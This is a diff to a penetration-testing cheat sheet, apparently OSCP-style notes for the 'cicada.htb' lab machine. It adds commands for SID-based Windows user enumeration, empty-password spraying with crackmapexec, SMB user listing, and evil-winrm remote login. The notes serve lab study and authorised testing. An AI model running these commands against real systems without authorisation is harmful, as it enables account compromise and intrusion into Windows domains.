@@ -441,16 +441,38 @@ get <file> #to download file
 
    * Limit to ~5–10 minutes per service to avoid lockouts. ([Reddit](https://www.reddit.com/r/oscp/comments/1apxuuf/best_oscp_wordlists/?utm_source=chatgpt.com "Best OSCP wordlists : r/oscp"))
 
-
-
 - - -
 
 # Windows SID Enumeration (Users)
 
-
-
 ```
 impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' |
 sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt
+```
 
+
+
+## W﻿indows Password Spraying(with a user wordlist)
+
+```
+crackmapexec smb cicada.htb -u users.txt -p ''
+```
+
+## \
+\
+E﻿numerating Domain Users (Using SMB)
+
+```
+crackmapexec smb <hostname/ipaddress> -u <username> -p '' --
+users
+```
+
+
+
+## W﻿indows Remote Management (Evil-winrm)
+
+
+
+```
+evil-winrm -u <username> -p '' -i cicada.htb
 ```
